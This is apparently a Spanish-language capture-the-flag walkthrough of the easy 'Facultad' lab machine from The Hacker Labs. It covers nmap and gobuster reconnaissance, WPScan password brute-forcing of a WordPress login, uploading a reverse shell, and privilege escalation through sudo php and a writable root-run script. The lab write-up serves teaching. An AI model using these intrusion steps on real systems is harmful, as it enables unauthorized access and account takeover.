---
description: >-
  ✍️ Autor: beafn28🔍 Dificultad: Fácil📅 Fecha de creación: 30/1/2025 🖥️The
  Hacker Labs
---

# Facultad

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 192.168.1.61
```

para verificar la conectividad de red.

<figure><img src="../.gitbook/assets/image (1034).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 192.168.1.61
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1)  (27).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 192.168.1.61
```

para obtener más información sobre esos puertos específicamente.

<figure><img src="../.gitbook/assets/image (1036).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora indagamos sobre el **servicio HTTP**. Se ingresó la **dirección IP** en el navegador lo que llevó a que la página web sea como el Studium de una asignatura en este caso se llama Administración de Sistemas.

<figure><img src="../.gitbook/assets/image (1037).png" alt=""><figcaption></figcaption></figure>

Ahora buscaremos directorios con la herramienta **Gobuster** a través de:

```bash
gobuster dir -u http://192.168.1.61/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

<figure><img src="../.gitbook/assets/image (1038).png" alt=""><figcaption></figcaption></figure>

Vamos a ver el contenido del directorio`/images`.

<figure><img src="../.gitbook/assets/image (1039).png" alt=""><figcaption></figcaption></figure>

Nos la descargamos para realizar la técnica de esteganografía.

<figure><img src="../.gitbook/assets/image (1040).png" alt=""><figcaption></figcaption></figure>

Vemos el contenido del archivo. Descubrimos dos posibles usuarios.

<figure><img src="../.gitbook/assets/image (1041).png" alt=""><figcaption></figcaption></figure>

Vamos a ver el contenido del directorio`/education`.&#x20;

<figure><img src="../.gitbook/assets/image (1042).png" alt=""><figcaption></figcaption></figure>

Como podemos comprobar es un WordPress por lo que añadimos el dominio **facultad.thl** a **/etc/hosts**.

<figure><img src="../.gitbook/assets/image (1043).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Al tener el directorio wp-admin sabemos que es un panel de login pero no tenemos las credenciales por lo que con **WPScan** enumeramos el usuario.

```bash
wpscan --url http://192.168.1.61/education/ --enumerate u,vp
```

<figure><img src="../.gitbook/assets/image (1044).png" alt=""><figcaption></figcaption></figure>

Sabiendo el usuario tenemos que conseguir la contraseña.

```bash
wpscan --url http://192.168.1.61/education/ --passwords /usr/share/wordlists/rockyou.txt --usernames facultad
```

<figure><img src="../.gitbook/assets/image (1045).png" alt=""><figcaption></figcaption></figure>

Ingresamos las credenciales en el panel de **login**.

<figure><img src="../.gitbook/assets/image (1046).png" alt=""><figcaption></figcaption></figure>

Vemos que hay un apartado para subir archivos por lo que adjuntamos una [ReverseShell](https://www.revshells.com/).

<figure><img src="../.gitbook/assets/image (1047).png" alt=""><figcaption></figcaption></figure>

Nos ponemos en escucha.

```bash
nc -nlvp 443
```

<figure><img src="../.gitbook/assets/image (1048).png" alt=""><figcaption></figcaption></figure>

Hacemos el [tratamiento de la TTY](https://invertebr4do.github.io/tratamiento-de-tty/) para trabajar más cómodos.

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.

<figure><img src="../.gitbook/assets/image (1049).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://gtfobins.github.io/gtfobins/php/" %}

```bash
sudo -u gabri php -r "system('/bin/bash');"
```

Como comprobamos en el mensaje la contraseña de Vivian está en el mail de Gabri.

<figure><img src="../.gitbook/assets/image (1050).png" alt=""><figcaption></figcaption></figure>

Mostramos el contenido que es la contraseña codificada en **Brainfuck** por lo que la decodificamos.

<figure><img src="../.gitbook/assets/image (1051).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (1052).png" alt=""><figcaption></figcaption></figure>

Iniciamos sesión con las credenciales.

<figure><img src="../.gitbook/assets/image (1053).png" alt=""><figcaption></figcaption></figure>

Tenemos permisos de **root** para ejecutar un script.

<figure><img src="../.gitbook/assets/image (1054).png" alt=""><figcaption></figcaption></figure>

Vemos el contenido y así podemos modificarlo para escalar privilegios. Nos damos cuenta que el script se ejecuta cada minuto en el **/etc/crontab**.

<figure><img src="../.gitbook/assets/image (1055).png" alt=""><figcaption></figcaption></figure>

```bash
#!/bin/bash
bash
```

Ejecutamos.

```
sudo /opt/vivian/script.sh
```

<figure><img src="../.gitbook/assets/image (1056).png" alt=""><figcaption></figcaption></figure>

Ya somos **root** por lo que ahora encontraremos la bandera en sus directorios.

Te deseo mucho éxito en tu búsqueda de las flags! Recuerda prestar atención a cada detalle, examinar los archivos y servicios con detenimiento, y utilizar todas las herramientas disponibles para encontrarlas. La clave para el éxito está en la perseverancia y en no dejar ningún rincón sin explorar. ¡Adelante, hacker! 💻🔍🚀
